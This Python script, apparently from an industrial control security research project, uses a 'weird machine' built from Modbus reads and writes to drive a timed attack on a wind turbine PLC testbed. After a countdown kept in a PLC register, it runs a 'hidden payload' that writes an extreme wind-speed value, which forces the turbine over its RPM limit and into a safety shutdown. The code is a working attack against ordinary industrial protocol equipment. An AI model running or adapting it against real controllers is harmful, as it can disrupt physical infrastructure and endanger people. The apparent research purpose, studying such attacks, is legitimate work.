"""
Example: Building a Countdown Timer Using Loop Gadgets

This example demonstrates how to build a timer weird machine using
the repeat_until() loop gadget instead of Python while loops.

KEY INSIGHT: The loop is implemented through REPEATED MODBUS OPERATIONS,
not through Python control flow. The weird machine exists in the 
SEQUENCE OF MODBUS COMMANDS, not in any installed code.

Components:
1. ProtocolGadget - Modbus operations (FC03, FC06, FC01, FC05)
2. ControlGadget.repeat_until() - Loop via Modbus polling
3. Composition - How gadgets combine into a weird machine
"""

from weird_machine_gadgets import ProtocolGadget, ControlGadget


def build_timer(modbus: ProtocolGadget, 
                counter_register: int = 40001,
                active_coil: int = 10001,
                initial_count: int = 10,
                cycle_time: float = 0.1):
    """
    Build a countdown timer using architectural gadgets (no Python loops).

    The timer is built entirely from Modbus operations:
      - Initialization: FC06 (write register), FC05 (write coil)
      - Loop: FC03 (read), arithmetic, FC06 (write) - repeated
      - Completion: FC05 (write coil)
    """
    print(f"\n=== Building Timer Weird Machine ===")
    print(f"Counter register: {counter_register}")
    print(f"Active coil: {active_coil}")
    print(f"Countdown from: {initial_count}\n")

    # ------------------------------------------------------------
    # STEP 1: Initialization (like: countdown = 10, active = True)
    # ------------------------------------------------------------
    print("Step 1: Initialization")
    print(f"  FC06 write_register({counter_register}, {initial_count})")
    modbus.write_register(counter_register, initial_count)

    print(f"  FC05 write_coil({active_coil}, TRUE)")
    modbus.write_coil(active_coil, True)
    print("  Timer initialized\n")

    # ------------------------------------------------------------
    # STEP 2: The Loop (THE WEIRD MACHINE!)
    # ------------------------------------------------------------
    # Loop implemented using repeat_until() - pure Modbus control logic
    print("Step 2: Countdown Loop")
    print("(Implemented via repeat_until() architectural gadget)\n")

    control = ControlGadget(modbus)

    # Stop condition — FC03: read register until 0
    def is_zero():
        value = modbus.read_register(counter_register)
        if value == 0:
            print("  Counter reached 0.\n")
        return value == 0

    # Loop body — FC03 read, subtract 1, FC06 write
    def decrement():
        current = modbus.read_register(counter_register)   # FC03
        print(f"  FC03 read_register({counter_register}) = {current}")

        new_val = current - 1
        print(f"  Arithmetic: {current} - 1 = {new_val}")

        modbus.write_register(counter_register, new_val)   # FC06
        print(f"  FC06 write_register({counter_register}, {new_val})\n")

    # Execute loop via architectural gadget
    iterations = control.repeat_until(
        condition=is_zero,
        body=decrement,
        delay=cycle_time
    )

    print(f"Executed {iterations} iterations\n")

    # ------------------------------------------------------------
    # STEP 3: Cleanup
    # ------------------------------------------------------------
    print("Step 3: Cleanup")
    print(f"  FC05 write_coil({active_coil}, FALSE)")
    modbus.write_coil(active_coil, False)
    print("  Timer deactivated\n")

    return iterations


def main():
    """Main example showing timer construction using Modbus primitives."""
    TESTBED_IP = "192.168.1.100"
    MODBUS_PORT = 502

    print("=" * 70)
    print("Timer Weird Machine (No Python Loops!)")
    print("=" * 70)
    print(f"\nConnecting to {TESTBED_IP}:{MODBUS_PORT}...")

    with ProtocolGadget(TESTBED_IP, port=MODBUS_PORT) as modbus:
        print("Connected.\n")

        # Create a 10-cycle countdown
        iterations = build_timer(
            modbus=modbus,
            counter_register=40001,
            active_coil=10001,
            initial_count=10,
            cycle_time=0.1
        )

        # Hidden payload (trigger wind speed change)
        print("=" * 70)
        print("EXECUTING PAYLOAD")
        print("=" * 70)
        print("\nTimer complete. Triggering wind speed increase to 1023 "
              "(causes RPM > 35 and safety shutdown).\n")

        modbus.write_register(40003, 1023)
        print("Payload executed.\n")

        print("=" * 70)
        print("Weird Machine Complete")
        print("=" * 70)
        print(f"\nTotal Modbus operations: ~{iterations * 3 + 4}")
        print("  - Init: 2 writes")
        print(f"  - Loop: {iterations} × 3 (read + write + check)")
        print("  - Cleanup: 1 write")
        print("  - Payload: 1 write")
        print("\nAll computation occurs via Modbus commands. "
              "No code is executed on the PLC.\n")


# Run when executed directly
if __name__ == "__main__":
    main()
